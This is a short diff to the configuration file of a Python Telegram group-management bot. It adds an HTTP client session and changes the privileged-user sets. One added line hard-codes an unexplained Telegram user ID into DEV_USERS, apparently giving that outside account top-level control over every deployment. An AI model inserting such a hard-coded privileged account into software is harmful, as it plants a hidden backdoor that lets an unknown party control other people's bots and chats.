@@ -5,7 +5,7 @@ import platform
 import random
 import sys
 import time
-
+from aiohttp import ClientSession
 import telegram.ext as tg
 from dotenv import load_dotenv
 from motor.motor_asyncio import AsyncIOMotorClient as MongoCli
@@ -68,7 +68,10 @@ ALLOW_EXCL = Config.ALLOW_EXCL
 INFOPIC = Config.INFOPIC
 TEMP_DOWNLOAD_LOC = Config.TEMP_DOWNLOAD_LOC
 DB_NAME = Config.DB_NAME
+
+DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(5938660179)
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
 
@@ -121,6 +124,7 @@ def Asuinline(**args):
 
 
 application = EXON_PTB
+aiohttpsession = ClientSession()
 print("[ᴇxᴏɴ]: ɢᴇᴛᴛɪɴɢ ʙᴏᴛ ɪɴғᴏ...")
 BOT_ID = application.bot.id
 BOT_NAME = application.bot.first_name
